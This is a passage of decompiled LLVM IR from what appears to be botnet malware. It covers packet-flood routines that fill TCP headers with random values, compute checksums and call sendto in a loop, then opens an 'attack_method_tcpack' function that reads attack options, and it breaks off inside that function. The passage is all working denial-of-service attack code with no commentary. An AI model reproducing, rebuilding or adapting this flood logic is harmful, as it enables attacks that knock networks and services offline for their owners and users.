  store i16 %v3_b888, i16* %v4_b890, align 2
  %v0_b894 = load i32, i32* @r4, align 4
  %v1_b894 = add i32 %v0_b894, 20
  store i32 %v1_b894, i32* @r8, align 4
  %v1_b898 = add i32 %v0_b894, 33
  %v2_b898 = inttoptr i32 %v1_b898 to i8*
  %v3_b898 = load i8, i8* %v2_b898, align 1
  %v4_b898 = zext i8 %v3_b898 to i32
  store i32 %v4_b898, i32* %r2.global-to-local, align 4
  %v0_b89c = load i32, i32* %r1.global-to-local, align 4
  %v2_b89c = add i32 %v0_b894, 24
  %v3_b89c = inttoptr i32 %v2_b89c to i32*
  store i32 %v0_b89c, i32* %v3_b89c, align 4
  %v0_b8a0 = load i32, i32* %r2.global-to-local, align 4
  %v1_b8a0 = or i32 %v0_b8a0, 1
  store i32 %v1_b8a0, i32* %r2.global-to-local, align 4
  %v0_b8a4 = load i32, i32* %r3.global-to-local, align 4
  %v1_b8a4 = add i32 %v0_b8a4, 4
  %v2_b8a4 = inttoptr i32 %v1_b8a4 to i32*
  %v3_b8a4 = load i32, i32* %v2_b8a4, align 4
  store i32 %v3_b8a4, i32* %r1.global-to-local, align 4
  %v1_b8a8 = add i32 %v0_b8a4, 14
  %v2_b8a8 = inttoptr i32 %v1_b8a8 to i16*
  %v3_b8a8 = load i16, i16* %v2_b8a8, align 2
  %v4_b8a8 = zext i16 %v3_b8a8 to i32
  store i32 %v4_b8a8, i32* %r3.global-to-local, align 4
  %v1_b8ac = trunc i32 %v1_b8a0 to i8
  %v2_b8ac = load i32, i32* @r8, align 4
  %v3_b8ac = add i32 %v2_b8ac, 13
  %v4_b8ac = inttoptr i32 %v3_b8ac to i8*
  store i8 %v1_b8ac, i8* %v4_b8ac, align 1
  %v0_b8b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_b8b0 = trunc i32 %v0_b8b0 to i16
  %v2_b8b0 = load i32, i32* @r8, align 4
  %v3_b8b0 = add i32 %v2_b8b0, 2
  %v4_b8b0 = inttoptr i32 %v3_b8b0 to i16*
  store i16 %v1_b8b0, i16* %v4_b8b0, align 2
  %v0_b8b4 = load i32, i32* @r8, align 4
  %v1_b8b4 = add i32 %v0_b8b4, 12
  %v2_b8b4 = inttoptr i32 %v1_b8b4 to i8*
  %v3_b8b4 = load i8, i8* %v2_b8b4, align 1
  %v4_b8b4 = zext i8 %v3_b8b4 to i32
  store i32 %v4_b8b4, i32* %r3.global-to-local, align 4
  %v1_b8b8 = add i32 %v0_b8b4, 13
  %v2_b8b8 = inttoptr i32 %v1_b8b8 to i8*
  %v3_b8b8 = load i8, i8* %v2_b8b8, align 1
  %v4_b8b8 = zext i8 %v3_b8b8 to i32
  %tmp104 = urem i8 %v3_b8b4, 16
  %v1_b8bc = zext i8 %tmp104 to i32
  %v1_b8c0 = or i32 %v1_b8bc, 128
  store i32 %v1_b8c0, i32* %r3.global-to-local, align 4
  %v1_b8c4 = or i32 %v4_b8b8, 16
  store i32 %v1_b8c4, i32* %r2.global-to-local, align 4
  %v0_b8c8 = load i32, i32* %r1.global-to-local, align 4
  %v2_b8c8 = add i32 %v0_b8b4, 8
  %v3_b8c8 = inttoptr i32 %v2_b8c8 to i32*
  store i32 %v0_b8c8, i32* %v3_b8c8, align 4
  %v0_b8cc = load i32, i32* %r3.global-to-local, align 4
  %v1_b8cc = trunc i32 %v0_b8cc to i8
  %v2_b8cc = load i32, i32* @r8, align 4
  %v3_b8cc = add i32 %v2_b8cc, 12
  %v4_b8cc = inttoptr i32 %v3_b8cc to i8*
  store i8 %v1_b8cc, i8* %v4_b8cc, align 1
  %v0_b8d0 = load i32, i32* %r2.global-to-local, align 4
  %v1_b8d0 = trunc i32 %v0_b8d0 to i8
  %v2_b8d0 = load i32, i32* @r8, align 4
  %v3_b8d0 = add i32 %v2_b8d0, 13
  %v4_b8d0 = inttoptr i32 %v3_b8d0 to i8*
  store i8 %v1_b8d0, i8* %v4_b8d0, align 1
  %v0_b8d4 = call i32 @rand_next()
  %v1_b8d4 = trunc i32 %v0_b8d4 to i16
  store i32 %v0_b8d4, i32* %r0.global-to-local, align 4
  store i32 %v1_b418, i32* %r1.global-to-local, align 4
  %v0_b8dc = load i32, i32* @r8, align 4
  %v1_b8dc = add i32 %v0_b8dc, 13
  %v2_b8dc = inttoptr i32 %v1_b8dc to i8*
  %v3_b8dc = load i8, i8* %v2_b8dc, align 1
  %v4_b8dc = zext i8 %v3_b8dc to i32
  store i32 %v1_b8e0, i32* %r2.global-to-local, align 4
  %v1_b8e4 = and i32 %v4_b8dc, 223
  %v5_b8e8 = or i32 %v1_b8e4, %v4_b8e8
  store i32 %v5_b8e8, i32* %r3.global-to-local, align 4
  %v1_b8ec = trunc i32 %v5_b8e8 to i8
  store i8 %v1_b8ec, i8* %v2_b8dc, align 1
  store i32 %v1_b438, i32* %ip.global-to-local, align 4
  %v0_b8f4 = load i32, i32* @r8, align 4
  %v1_b8f4 = add i32 %v0_b8f4, 13
  %v2_b8f4 = inttoptr i32 %v1_b8f4 to i8*
  %v3_b8f4 = load i8, i8* %v2_b8f4, align 1
  %v4_b8f4 = zext i8 %v3_b8f4 to i32
  store i32 %v1_b8f8, i32* %r3.global-to-local, align 4
  %v1_b8fc = and i32 %v4_b8f4, 239
  %v5_b900 = or i32 %v1_b8fc, %v4_b900
  store i32 %v5_b900, i32* %r2.global-to-local, align 4
  %v1_b904 = trunc i32 %v5_b900 to i8
  store i8 %v1_b904, i8* %v2_b8f4, align 1
  store i32 %v1_b458, i32* %r1.global-to-local, align 4
  %v0_b90c = load i32, i32* @r8, align 4
  %v1_b90c = add i32 %v0_b90c, 13
  %v2_b90c = inttoptr i32 %v1_b90c to i8*
  %v3_b90c = load i8, i8* %v2_b90c, align 1
  %v4_b90c = zext i8 %v3_b90c to i32
  store i32 %v1_b910, i32* %r2.global-to-local, align 4
  %v1_b914 = and i32 %v4_b90c, 247
  %v5_b918 = or i32 %v1_b914, %v4_b918
  store i32 %v5_b918, i32* %r3.global-to-local, align 4
  %v1_b91c = trunc i32 %v5_b918 to i8
  store i8 %v1_b91c, i8* %v2_b90c, align 1
  store i32 %v1_b478, i32* %ip.global-to-local, align 4
  %v0_b924 = load i32, i32* @r8, align 4
  %v1_b924 = add i32 %v0_b924, 13
  %v2_b924 = inttoptr i32 %v1_b924 to i8*
  %v3_b924 = load i8, i8* %v2_b924, align 1
  %v4_b924 = zext i8 %v3_b924 to i32
  store i32 %v1_b928, i32* %r3.global-to-local, align 4
  %v1_b92c = and i32 %v4_b924, 251
  %v5_b930 = or i32 %v1_b92c, %v4_b930
  store i32 %v5_b930, i32* %r2.global-to-local, align 4
  %v1_b934 = trunc i32 %v5_b930 to i8
  store i8 %v1_b934, i8* %v2_b924, align 1
  store i32 %v1_b498, i32* %r1.global-to-local, align 4
  %v0_b93c = load i32, i32* @r8, align 4
  %v1_b93c = add i32 %v0_b93c, 13
  %v2_b93c = inttoptr i32 %v1_b93c to i8*
  %v3_b93c = load i8, i8* %v2_b93c, align 1
  %v4_b93c = zext i8 %v3_b93c to i32
  store i32 %v1_b940, i32* %r2.global-to-local, align 4
  %v1_b944 = and i32 %v4_b93c, 253
  %v4_b948 = or i32 %v1_b944, %v3_b948
  store i32 %v4_b948, i32* %r3.global-to-local, align 4
  %v1_b94c = trunc i32 %v4_b948 to i8
  store i8 %v1_b94c, i8* %v2_b93c, align 1
  store i32 %v1_b4b8, i32* %ip.global-to-local, align 4
  %v0_b954 = load i32, i32* @r8, align 4
  %v1_b954 = add i32 %v0_b954, 13
  %v2_b954 = inttoptr i32 %v1_b954 to i8*
  %v3_b954 = load i8, i8* %v2_b954, align 1
  %v4_b954 = zext i8 %v3_b954 to i32
  %v1_b95c = and i32 %v4_b954, 254
  store i32 %v1_b95c, i32* %r2.global-to-local, align 4
  %v2_b960 = or i32 %v1_b95c, %v1_b958
  store i32 %v2_b960, i32* %r3.global-to-local, align 4
  %v1_b964 = trunc i32 %v2_b960 to i8
  store i8 %v1_b964, i8* %v2_b954, align 1
  %v3_b968 = load i32, i32* @r8, align 4
  %v4_b968 = add i32 %v3_b968, 14
  %v5_b968 = inttoptr i32 %v4_b968 to i16*
  store i16 %v1_b8d4, i16* %v5_b968, align 2
  store i32 %v6_b4d0, i32* %r1.global-to-local, align 4
  %v0_b970 = load i32, i32* @r4, align 4
  %v1_b970 = add i32 %v0_b970, 40
  store i32 %v1_b970, i32* %r0.global-to-local, align 4
  %v2_b974 = inttoptr i32 %v1_b970 to i16*
  %v3_b974 = call i32 @rand_str(i16* %v2_b974, i32 %v6_b4d0)
  store i32 %v3_b974, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b6c8

dec_label_pc_b97c:                                ; preds = %dec_label_pc_b53c
  store i32 %v6_b4d0, i32* %r1.global-to-local, align 4
  %.pre = add i32 %v6_b4d0, 40
  br label %dec_label_pc_b98c

dec_label_pc_b98c:                                ; preds = %dec_label_pc_b6dc, %dec_label_pc_b97c
  %storemerge6.pre-phi = phi i32 [ %v1_b7cc, %dec_label_pc_b6dc ], [ %.pre, %dec_label_pc_b97c ]
  %v0_b9a026 = phi i32 [ %v1_b6d0, %dec_label_pc_b6dc ], [ 0, %dec_label_pc_b97c ]
  store i32 %storemerge6.pre-phi, i32* @r7, align 4
  %storemerge4 = mul i32 %v6_b4d0, 65536
  %storemerge = add i32 %v6_b4d0, 20
  store i32 %storemerge, i32* @sl, align 4
  %v1_b98c = add i32 %storemerge4, 1310720
  store i32 %v1_b98c, i32* %r2.global-to-local, align 4
  %tmp83 = udiv i32 %v1_b98c, 256
  %v3_b994 = and i32 %tmp83, 65280
  store i32 %v3_b994, i32* %r3.global-to-local, align 4
  %v4_b998 = udiv i32 %v1_b98c, 16777216
  %v5_b998 = or i32 %v3_b994, %v4_b998
  store i32 %v5_b998, i32* @r8, align 4
  %v2_bac4 = icmp eq i32 %v1_b4f0, 0
  br label %dec_label_pc_b99c

dec_label_pc_b99c:                                ; preds = %dec_label_pc_b99c, %dec_label_pc_baa8, %dec_label_pc_b98c
  %v0_b9a0 = phi i32 [ %v0_b9a026, %dec_label_pc_b98c ], [ 0, %dec_label_pc_baa8 ], [ 0, %dec_label_pc_b99c ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_b9a0 = icmp eq i32 %v0_b9a0, 0
  store i1 %v2_b9a0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_b9a0, label %dec_label_pc_b99c, label %dec_label_pc_b9ac

dec_label_pc_b9ac:                                ; preds = %dec_label_pc_b99c, %dec_label_pc_baa8
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b9b0

dec_label_pc_b9b0:                                ; preds = %dec_label_pc_b9d8, %dec_label_pc_b9ac
  %v1_b9b8 = phi i32 [ %v1_ba98, %dec_label_pc_b9d8 ], [ 0, %dec_label_pc_b9ac ]
  store i32 %v2_b35c, i32* %r2.global-to-local, align 4
  store i32 65536, i32* %r3.global-to-local, align 4
  %v4_b9b8 = mul i32 %v1_b9b8, 4
  %v5_b9b8 = add i32 %v4_b9b8, %v2_b35c
  %v6_b9b8 = inttoptr i32 %v5_b9b8 to i32*
  %v7_b9b8 = load i32, i32* %v6_b9b8, align 4
  store i32 %v7_b9b8, i32* @r4, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_b9c0 = load i32, i32* @fp, align 4
  %v9_b9c0 = icmp eq i32 %v0_b9c0, 65535
  store i1 %v9_b9c0, i1* %cpsr_z.global-to-local, align 1
  %v1_b9c4 = add i32 %v7_b9b8, 20
  store i32 %v1_b9c4, i32* @r5, align 4
  br i1 %v9_b9c0, label %dec_label_pc_babc, label %dec_label_pc_b9cc

dec_label_pc_b9cc:                                ; preds = %dec_label_pc_b9b0
  store i32 %v1_b4f0, i32* %r3.global-to-local, align 4
  store i1 %v2_bac4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_bac4, label %dec_label_pc_b9d8, label %dec_label_pc_bad0

dec_label_pc_b9d8:                                ; preds = %dec_label_pc_b9cc, %dec_label_pc_babc, %dec_label_pc_bad0
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_b9dc = load i32, i32* @r4, align 4
  %v3_b9dc = add i32 %v2_b9dc, 10
  %v4_b9dc = inttoptr i32 %v3_b9dc to i16*
  store i16 0, i16* %v4_b9dc, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_b9e4 = load i32, i32* @r4, align 4
  store i32 %v0_b9e4, i32* @r0, align 4
  %v2_b9e8 = call i32 @checksum_generic(i32 %v0_b9e4, i32 20)
  %v3_b9e8 = trunc i32 %v2_b9e8 to i16
  store i32 %v2_b9e8, i32* %r0.global-to-local, align 4
  %v3_b9ec = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_b34c, i32* %r2.global-to-local, align 4
  %v3_b9f4 = mul i32 %v3_b9ec, 16
  %v2_b9f8 = add i32 %v3_b9f4, %v2_b34c
  store i32 %v2_b9f8, i32* %r1.global-to-local, align 4
  %v1_b9fc = add i32 %v2_b9f8, 4
  %v2_b9fc = inttoptr i32 %v1_b9fc to i32*
  %v3_b9fc = load i32, i32* %v2_b9fc, align 4
  %v3_ba00 = mul i32 %v3_b9fc, 65536
  store i32 %v3_ba00, i32* %ip.global-to-local, align 4
  %tmp85 = mul i32 %v3_b9fc, 256
  %v1_ba08 = and i32 %tmp85, 65280
  %tmp86 = udiv i32 %v3_b9fc, 256
  %v4_ba0c = urem i32 %tmp86, 256
  %v5_ba0c = or i32 %v4_ba0c, %v1_ba08
  store i32 %v5_ba0c, i32* %r3.global-to-local, align 4
  %v1_ba10 = add i32 %v3_b9fc, 1
  store i32 %v1_ba10, i32* %r2.global-to-local, align 4
  store i32 %v1_ba10, i32* %v2_b9fc, align 4
  %v0_ba18 = load i32, i32* %r3.global-to-local, align 4
  %v1_ba18 = load i32, i32* @r5, align 4
  %v2_ba18 = add i32 %v1_ba18, 4
  %v3_ba18 = inttoptr i32 %v2_ba18 to i32*
  store i32 %v0_ba18, i32* %v3_ba18, align 4
  %v0_ba1c = load i32, i32* %r1.global-to-local, align 4
  %v1_ba1c = add i32 %v0_ba1c, 8
  %v2_ba1c = inttoptr i32 %v1_ba1c to i32*
  %v3_ba1c = load i32, i32* %v2_ba1c, align 4
  %tmp87 = mul i32 %v3_ba1c, 256
  %v1_ba28 = and i32 %tmp87, 65280
  %tmp88 = udiv i32 %v3_ba1c, 256
  %v4_ba2c = urem i32 %tmp88, 256
  %v5_ba2c = or i32 %v4_ba2c, %v1_ba28
  %v1_ba30 = load i32, i32* @r5, align 4
  %v2_ba30 = add i32 %v1_ba30, 8
  %v3_ba30 = inttoptr i32 %v2_ba30 to i32*
  store i32 %v5_ba2c, i32* %v3_ba30, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_ba38 = load i32, i32* @r4, align 4
  %v4_ba38 = add i32 %v3_ba38, 10
  %v5_ba38 = inttoptr i32 %v4_ba38 to i16*
  store i16 %v3_b9e8, i16* %v5_ba38, align 2
  %v0_ba3c = load i32, i32* @r5, align 4
  store i32 %v0_ba3c, i32* @r1, align 4
  %v0_ba40 = load i32, i32* %r3.global-to-local, align 4
  %v1_ba40 = trunc i32 %v0_ba40 to i16
  %v3_ba40 = add i32 %v0_ba3c, 16
  %v4_ba40 = inttoptr i32 %v3_ba40 to i16*
  store i16 %v1_ba40, i16* %v4_ba40, align 2
  %v0_ba44 = load i32, i32* @r8, align 4
  store i32 %v0_ba44, i32* %r2.global-to-local, align 4
  %v0_ba48 = load i32, i32* @sl, align 4
  store i32 %v0_ba48, i32* %r3.global-to-local, align 4
  %v0_ba4c = load i32, i32* @r4, align 4
  store i32 %v0_ba4c, i32* %r0.global-to-local, align 4
  %v4_ba50 = call i32 @checksum_tcpudp(i32 %v0_ba4c, i32 %v0_ba3c, i32 %v0_ba44, i32 %v0_ba48)
  %v5_ba50 = trunc i32 %v4_ba50 to i16
  store i32 %v4_ba50, i32* %r0.global-to-local, align 4
  %v3_ba54 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_ba54, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v3_ba5c = mul i32 %v3_ba54, 32
  store i32 %v3_ba5c, i32* %lr.global-to-local, align 4
  %v3_ba60 = load i32, i32* @r5, align 4
  %v4_ba60 = add i32 %v3_ba60, 16
  %v5_ba60 = inttoptr i32 %v4_ba60 to i16*
  store i16 %v5_ba50, i16* %v5_ba60, align 2
  %v0_ba64 = load i32, i32* %lr.global-to-local, align 4
  %v1_ba64 = load i32, i32* %r3.global-to-local, align 4
  %tmp105 = mul i32 %v1_ba64, -8
  %v5_ba64 = add i32 %v0_ba64, %tmp105
  store i32 %v5_ba64, i32* %lr.global-to-local, align 4
  %v0_ba68 = load i32, i32* @r5, align 4
  %v1_ba68 = add i32 %v0_ba68, 2
  %v2_ba68 = inttoptr i32 %v1_ba68 to i16*
  %v3_ba68 = load i16, i16* %v2_ba68, align 2
  %v4_ba68 = zext i16 %v3_ba68 to i32
  store i32 %v4_ba68, i32* @r5, align 4
  %v1_ba6c = load i32, i32* %ip.global-to-local, align 4
  %v2_ba6c = add i32 %v1_ba6c, %v5_ba64
  store i32 %v2_ba6c, i32* @lr, align 4
  %v3_ba70 = add i32 %v2_ba6c, 2
  %v4_ba70 = inttoptr i32 %v3_ba70 to i16*
  store i16 %v3_ba68, i16* %v4_ba70, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_ba7c = load i32, i32* @r4, align 4
  store i32 %v0_ba7c, i32* %r1.global-to-local, align 4
  %v0_ba80 = load i32, i32* @sb, align 4
  store i32 %v0_ba80, i32* %r0.global-to-local, align 4
  %v0_ba84 = load i32, i32* @r7, align 4
  store i32 %v0_ba84, i32* %r2.global-to-local, align 4
  %v0_ba88 = load i32, i32* @lr, align 4
  %v6_ba90 = call i32 @__libc_sendto(i32 %v0_ba80, i32 %v0_ba7c, i32 %v0_ba84, i32 16384, i32 %v0_ba88, i32 16)
  %v3_ba94 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_ba94, i32* %r3.global-to-local, align 4
  %v1_ba98 = add i32 %v3_ba94, 1
  store i32 %v1_ba98, i32* %r0.global-to-local, align 4
  %v0_ba9c = load i32, i32* @r6, align 4
  %v9_ba9c = icmp eq i32 %v0_ba9c, %v1_ba98
  store i1 %v9_ba9c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_ba98, i32* %stack_var_-44, align 4
  %v8_baa4 = icmp sgt i32 %v0_ba9c, %v1_ba98
  br i1 %v8_baa4, label %dec_label_pc_b9b0, label %dec_label_pc_baa8

dec_label_pc_baa8:                                ; preds = %dec_label_pc_b9d8
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_baac = icmp eq i32 %v0_ba9c, 0
  store i1 %v2_baac, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_baac, label %dec_label_pc_b99c, label %dec_label_pc_b9ac

dec_label_pc_babc:                                ; preds = %dec_label_pc_b9b0
  %v0_babc = call i32 @rand_next()
  %v1_babc = trunc i32 %v0_babc to i16
  store i32 %v0_babc, i32* %r0.global-to-local, align 4
  store i32 %v1_b4f0, i32* %r3.global-to-local, align 4
  store i1 %v2_bac4, i1* %cpsr_z.global-to-local, align 1
  %v3_bac8 = load i32, i32* @r4, align 4
  %v4_bac8 = add i32 %v3_bac8, 4
  %v5_bac8 = inttoptr i32 %v4_bac8 to i16*
  store i16 %v1_babc, i16* %v5_bac8, align 2
  br i1 %v2_bac4, label %dec_label_pc_b9d8, label %dec_label_pc_babc.dec_label_pc_bad0_crit_edge

dec_label_pc_babc.dec_label_pc_bad0_crit_edge:    ; preds = %dec_label_pc_babc
  %v0_bad0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_bad0

dec_label_pc_bad0:                                ; preds = %dec_label_pc_babc.dec_label_pc_bad0_crit_edge, %dec_label_pc_b9cc
  %v0_bad0 = phi i32 [ %v0_bad0.pre, %dec_label_pc_babc.dec_label_pc_bad0_crit_edge ], [ %v7_b9b8, %dec_label_pc_b9cc ]
  %v1_bad0 = add i32 %v0_bad0, 40
  store i32 %v1_bad0, i32* %r0.global-to-local, align 4
  store i32 %v6_b4d0, i32* %r1.global-to-local, align 4
  %v2_bad8 = inttoptr i32 %v1_bad0 to i16*
  %v3_bad8 = call i32 @rand_str(i16* %v2_bad8, i32 %v6_b4d0)
  store i32 %v3_bad8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b9d8

; uselistorder directives
  uselistorder i32 %v0_babc, { 1, 0 }
  uselistorder i32 %v1_ba98, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_ba64, { 1, 0 }
  uselistorder i32 %v4_ba50, { 1, 0 }
  uselistorder i32 %v3_ba1c, { 1, 0 }
  uselistorder i32 %v3_b9fc, { 3, 2, 0, 1 }
  uselistorder i32 %v2_b9e8, { 1, 0 }
  uselistorder i1 %v2_bac4, { 2, 3, 1, 0 }
  uselistorder i32 %v0_b8d4, { 1, 0 }
  uselistorder i32 %v0_b80c, { 1, 0 }
  uselistorder i32 %v5_b7a0, { 1, 0 }
  uselistorder i32 %v0_b760, { 1, 0 }
  uselistorder i32 %v0_b71c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_b6cc, { 1, 0, 2, 3 }
  uselistorder i32 %v3_b6b8, { 1, 0, 3, 4, 2 }
  uselistorder i1 %v7_b644, { 1, 0 }
  uselistorder i32 %v6_b63c, { 0, 2, 1, 3 }
  uselistorder i1 %v9_b66c, { 1, 0 }
  uselistorder i32 %v4_b680, { 1, 0 }
  uselistorder i16 %stack_var_-62.2, { 0, 1, 3, 2 }
  uselistorder i32 %v0_b5c8, { 1, 0, 2 }
  uselistorder i32 %v0_b778, { 1, 0, 2, 4, 5, 3 }
  uselistorder i32 %v4_b5b8, { 1, 0 }
  uselistorder i1 %v7_b5b0, { 1, 0, 2 }
  uselistorder i1 %v7_b564, { 1, 0 }
  uselistorder i32 %v3_b560, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-60.0, { 1, 0 }
  uselistorder i16 %stack_var_-62.0, { 1, 0 }
  uselistorder i32 %v1_b940, { 1, 0 }
  uselistorder i32 %v1_b928, { 1, 0 }
  uselistorder i32 %v1_b910, { 1, 0 }
  uselistorder i32 %v1_b8f8, { 1, 0 }
  uselistorder i32 %v1_b8e0, { 1, 0 }
  uselistorder i32 %v3_b678, { 1, 0 }
  uselistorder i1 %v2_b694, { 1, 0 }
  uselistorder i32 %v1_b690, { 1, 0 }
  uselistorder i32 %v4_b68c, { 2, 0, 1 }
  uselistorder i32 %v2_b5a0, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v0_b53c, { 1, 0 }
  uselistorder i1 %v7_b534, { 1, 0 }
  uselistorder i1 %v7_b508, { 1, 0 }
  uselistorder i32 %v3_b504, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v1_b4f0, { 2, 3, 1, 0 }
  uselistorder i32 %v6_b4d0, { 9, 8, 2, 0, 1, 10, 5, 4, 6, 7, 3 }
  uselistorder i32 %v1_b4b8, { 1, 0 }
  uselistorder i32 %v1_b498, { 1, 0 }
  uselistorder i32 %v1_b478, { 1, 0 }
  uselistorder i32 %v1_b458, { 1, 0 }
  uselistorder i32 %v1_b438, { 1, 0 }
  uselistorder i32 %v1_b418, { 1, 0 }
  uselistorder i32 %v6_b3f4, { 1, 0 }
  uselistorder i32 %v1_b3dc, { 1, 0 }
  uselistorder i8 %v5_b394, { 1, 0 }
  uselistorder i32 %v6_b374, { 1, 0 }
  uselistorder i32 %v2_b35c, { 0, 3, 1, 2 }
  uselistorder i32 %v2_b34c, { 0, 7, 1, 4, 2, 5, 3, 6 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 34, 35, 36, 37, 38, 39, 40, 41, 43, 42, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 44, 43, 45, 47, 46, 48, 50, 49, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 5, 7, 6, 9, 8, 11, 10, 16, 12, 13, 14, 15, 19, 17, 18, 21, 20, 22, 25, 24, 23, 26, 27, 28, 30, 31, 29, 32, 34, 33, 35, 36, 37, 39, 38, 40, 42, 41, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 0, 16, 17, 14, 18, 19, 20, 21, 22, 23 }
  uselistorder i32 %arg2, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b9d8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b9ac, { 1, 0 }
  uselistorder label %dec_label_pc_b99c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b98c, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %bb80, { 1, 0 }
  uselistorder label %dec_label_pc_b6f8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b6c8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b604, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_b5e4, { 1, 0 }
  uselistorder label %dec_label_pc_b5c0, { 1, 0 }
  uselistorder label %bb71, { 1, 0 }
  uselistorder label %dec_label_pc_b570, { 1, 0 }
  uselistorder label %dec_label_pc_b554, { 1, 0 }
}

define i32 @attack_method_tcpack(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v18_bae4 = load i32, i32* @sb, align 4
  %v24_bae4 = load i32, i32* @fp, align 4
  %v27_bae4 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_bb00 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_bb04 = load i32, i32* @r5, align 4
  store i32 %v0_bb04, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bb14 = load i32, i32* @r4, align 4
  store i32 %v0_bb14, i32* %r0.global-to-local, align 4
  %v5_bb18 = inttoptr i32 %v0_bb04 to i32*
  %v6_bb18 = call i32 @attack_get_opt_int(i32 %v0_bb14, i32* %v5_bb18, i32 2, i32 0)
  %v1_bb24 = urem i32 %v6_bb18, 256
  store i32 %v1_bb24, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_bb30 = load i32, i32* @r5, align 4
  store i32 %v0_bb30, i32* %r1.global-to-local, align 4
  %v0_bb34 = load i32, i32* @r4, align 4
  store i32 %v0_bb34, i32* %r0.global-to-local, align 4
  %v6_bb3c = inttoptr i32 %v0_bb30 to i32*
  %v7_bb3c = call i32 @attack_get_opt_int(i32 %v0_bb34, i32* %v6_bb3c, i32 3, i32 65535)
  %v0_bb40 = load i32, i32* @r5, align 4
  store i32 %v0_bb40, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_bb3c, i32* %sb.global-to-local, align 4
  %v0_bb50 = load i32, i32* @r4, align 4
  store i32 %v0_bb50, i32* %r0.global-to-local, align 4
  %v4_bb54 = inttoptr i32 %v0_bb40 to i32*
  %v5_bb54 = call i32 @attack_get_opt_int(i32 %v0_bb50, i32* %v4_bb54, i32 4, i32 64)
